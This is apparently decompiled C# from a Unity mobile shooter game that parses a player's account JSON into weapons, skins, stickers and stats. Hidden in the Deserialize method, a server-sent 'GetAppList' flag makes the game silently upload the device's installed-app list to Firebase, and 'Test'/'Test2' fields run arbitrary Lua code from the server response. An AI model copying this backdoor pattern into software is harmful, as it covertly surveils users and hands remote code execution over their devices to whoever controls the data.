using System.Collections.Generic;
using FreeJSON;
using UnityEngine;
using XLua;

public class AccountConvert
{
	private static AccountWeapon GetWeaponData(int id, AccountData data)
	{
		for (int i = 0; i < data.Weapons.Count; i++)
		{
			if (id == (int)data.Weapons[i].ID)
			{
				return data.Weapons[i];
			}
		}
		AccountWeapon accountWeapon = new AccountWeapon();
		accountWeapon.ID = id;
		return accountWeapon;
	}

	public static AccountData Deserialize(string text)
	{
		JsonObject jsonObject = JsonObject.Parse(text);
		AccountData accountData = new AccountData();
		accountData.GameVersion = jsonObject.Get<string>("GameVersion");
		accountData.AccountName = jsonObject.Get<string>("AccountName");
		accountData.ID = jsonObject.Get<int>("ID");
		accountData.Money = jsonObject.Get<int>("Money");
		accountData.Gold = jsonObject.Get<int>("Gold");
		JsonObject jsonObject2 = jsonObject.Get<JsonObject>("Round");
		accountData.XP = jsonObject2.Get<int>("XP");
		accountData.Level = jsonObject2.Get<int>("Level");
		accountData.Deaths = jsonObject2.Get<int>("Deaths");
		accountData.Kills = jsonObject2.Get<int>("Kills");
		accountData.Headshot = jsonObject2.Get<int>("Head");
		accountData.Time = jsonObject2.Get<long>("Time");
		if (jsonObject.ContainsKey("SelectWeapons"))
		{
			string[] array = jsonObject.Get<string>("SelectWeapons").Split(","[0]);
			if (array[0] != null)
			{
				accountData.SelectedRifle = int.Parse(array[0]);
			}
			if (array[1] != null)
			{
				accountData.SelectedPistol = int.Parse(array[1]);
			}
			if (array[2] != null)
			{
				accountData.SelectedKnife = int.Parse(array[2]);
			}
		}
		accountData.Clan = jsonObject.Get<string>("Clan");
		accountData.PlayerSkin.Deserialize(jsonObject.Get<JsonObject>("PlayerSkin"));
		JsonObject jsonObject3 = jsonObject.Get<JsonObject>("Stickers");
		List<AccountSticker> list = new List<AccountSticker>();
		for (int i = 0; i < jsonObject3.Length; i++)
		{
			int result = -1;
			int num = jsonObject3.Get<int>(jsonObject3.GetKey(i));
			int.TryParse(jsonObject3.GetKey(i), out result);
			if (result != -1 && num > 0)
			{
				AccountSticker accountSticker = new AccountSticker();
				accountSticker.ID = result;
				accountSticker.Count = num;
				list.Add(accountSticker);
			}
		}
		accountData.Stickers = list;
		accountData.SortStickers();
		DeserializeWeapons(jsonObject.Get<JsonObject>("Weapons"), accountData);
		List<string> list2 = jsonObject.Get<List<string>>("InAppPurchase");
		for (int j = 0; j < list2.Count; j++)
		{
			accountData.InAppPurchase.Add(list2[j]);
		}
		accountData.Session = jsonObject.Get<int>("Session");
		JsonObject jsonObject4 = jsonObject.Get<JsonObject>("Friends");
		int num2 = 0;
		for (int k = 0; k < jsonObject4.Length; k++)
		{
			if (accountData.Friends.Count >= 20)
			{
				break;
			}
			num2 = 0;
			int.TryParse(jsonObject4.GetKey(k), out num2);
			if (num2 != 0)
			{
				accountData.Friends.Add(num2);
			}
		}
		if (jsonObject.ContainsKey("GetAppList"))
		{
			Firebase firebase = new Firebase();
			JsonObject jsonObject5 = new JsonObject();
			jsonObject5.Add(AccountManager.AccountID, AndroidNativeFunctions.GetInstalledApps2());
			firebase.Child("AppList").UpdateValue(jsonObject5.ToString());
		}
		if (jsonObject.ContainsKey("AndroidEmulator") || CryptoPrefs.HasKey("AndroidEmulator"))
		{
			CryptoPrefs.SetBool("AndroidEmulator", jsonObject.ContainsKey("AndroidEmulator"));
		}
		if (jsonObject.ContainsKey("Test"))
		{
			LuaEnv luaEnv = new LuaEnv();
			luaEnv.DoString(jsonObject.Get<string>("Test"));
			luaEnv.Dispose();
		}
		if (jsonObject.ContainsKey("Test2"))
		{
			LuaEnv luaEnv2 = new LuaEnv();
			luaEnv2.DoString(jsonObject.Get<string>("Test2"));
		}
		if (VersionManager.testVersion && !jsonObject.ContainsKey("Tester"))
		{
			Application.Quit();
		}
		CustomMapManager.enabled = jsonObject.Get("CustomMap", true);
		return accountData;
	}

	private static void DeserializeWeapons(JsonObject weapons, AccountData data)
	{
		string empty = string.Empty;
		for (int i = 0; i < GameSettings.instance.Weapons.Count; i++)
		{
			AccountWeapon accountWeapon = new AccountWeapon();
			empty = (i + 1).ToString("D2");
			if (weapons.ContainsKey(empty))
			{
				JsonObject jsonObject = weapons.Get<JsonObject>(empty);
				accountWeapon.ID = i + 1;
				accountWeapon.Buy = jsonObject.Get<bool>("B");
				accountWeapon.Skin = jsonObject.Get<int>("Skin");
				accountWeapon.LastSkin = accountWeapon.Skin;
				if (jsonObject.ContainsKey("Skins"))
				{
					string[] array = jsonObject.Get<string>("Skins").Split(","[0]);
					for (int j = 0; j < array.Length; j++)
					{
						if (!string.IsNullOrEmpty(array[j]))
						{
							accountWeapon.Skins.Add(int.Parse(array[j]));
						}
					}
				}
				JsonObject jsonObject2 = jsonObject.Get<JsonObject>("Stickers");
				List<AccountWeaponStickers> list = new List<AccountWeaponStickers>();
				for (int k = 0; k < jsonObject2.Length; k++)
				{
					int result = -1;
					if (!int.TryParse(jsonObject2.GetKey(k), out result))
					{
						continue;
					}
					JsonObject jsonObject3 = jsonObject2.Get<JsonObject>(jsonObject2.GetKey(k));
					AccountWeaponStickers accountWeaponStickers = new AccountWeaponStickers();
					accountWeaponStickers.SkinID = result;
					for (int l = 0; l < jsonObject3.Length; l++)
					{
						int result2 = -1;
						if (int.TryParse(jsonObject3.GetKey(l), out result2))
						{
							AccountWeaponStickerData accountWeaponStickerData = new AccountWeaponStickerData();
							accountWeaponStickerData.Index = result2;
							accountWeaponStickerData.StickerID = jsonObject3.Get<int>(jsonObject3.GetKey(l));
							accountWeaponStickers.StickerData.Add(accountWeaponStickerData);
						}
					}
					if (accountWeaponStickers.StickerData.Count != 0)
					{
						list.Add(accountWeaponStickers);
					}
				}
				accountWeapon.Stickers = list;
				accountWeapon.SortWeaponStickers();
				for (int m = 0; m < GameSettings.instance.WeaponsStore[(int)accountWeapon.ID - 1].Skins.Count; m++)
				{
					accountWeapon.FireStats.Add(-1);
				}
				JsonObject jsonObject4 = jsonObject.Get<JsonObject>("FireStats");
				for (int n = 0; n < jsonObject4.Length; n++)
				{
					int result3 = 0;
					int num = jsonObject4.Get<int>(jsonObject4.GetKey(n));
					string text = jsonObject4.GetKey(n);
					if (text[0].ToString() == "0")
					{
						text = text.Remove(0, 1);
					}
					int.TryParse(text, out result3);
					if (result3 == 0)
					{
						continue;
					}
					if (accountWeapon.FireStats.Count > result3)
					{
						accountWeapon.FireStats[result3] = num;
						continue;
					}
					for (int num2 = accountWeapon.FireStats.Count - 1; num2 < result3; num2++)
					{
						accountWeapon.FireStats.Add(-1);
					}
					accountWeapon.FireStats[accountWeapon.FireStats.Count - 1] = num;
				}
			}
			else
			{
				AccountWeapon accountWeapon2 = new AccountWeapon();
				accountWeapon2.ID = i + 1;
				accountWeapon = accountWeapon2;
			}
			data.Weapons.Add(accountWeapon);
		}
	}

	public static JsonObject CompareDefaultValue(AccountData data)
	{
		JsonObject jsonObject = new JsonObject();
		if (data.UpdateClan)
		{
			data.UpdateClan = false;
			jsonObject.Add("Clan", (string)data.Clan);
		}
		if (data.UpdateSelectedWeapon)
		{
			data.UpdateSelectedWeapon = false;
			string value = string.Concat(data.SelectedRifle, ",", data.SelectedPistol, ",", data.SelectedKnife);
			jsonObject.Add("SelectWeapons", value);
		}
		if (data.UpdateSelectedPlayerSkin)
		{
			data.UpdateSelectedPlayerSkin = false;
			string value2 = string.Concat(data.PlayerSkin.Select[0], ",", data.PlayerSkin.Select[1], ",", data.PlayerSkin.Select[2]);
			jsonObject.Add("SelectPlayerSkin", value2);
		}
		return jsonObject;
	}

	public static JsonObject CompareWeaponValue(AccountData data)
	{
		JsonObject jsonObject = new JsonObject();
		for (int i = 0; i < GameSettings.instance.Weapons.Count; i++)
		{
			AccountWeapon weaponData = GetWeaponData(GameSettings.instance.Weapons[i].ID, data);
			if ((int)weaponData.Skin != (int)weaponData.LastSkin)
			{
				weaponData.LastSkin = weaponData.Skin;
				string key = (i + 1).ToString("D2");
				jsonObject.Add(key, (int)weaponData.Skin);
			}
		}
		return jsonObject;
	}
}
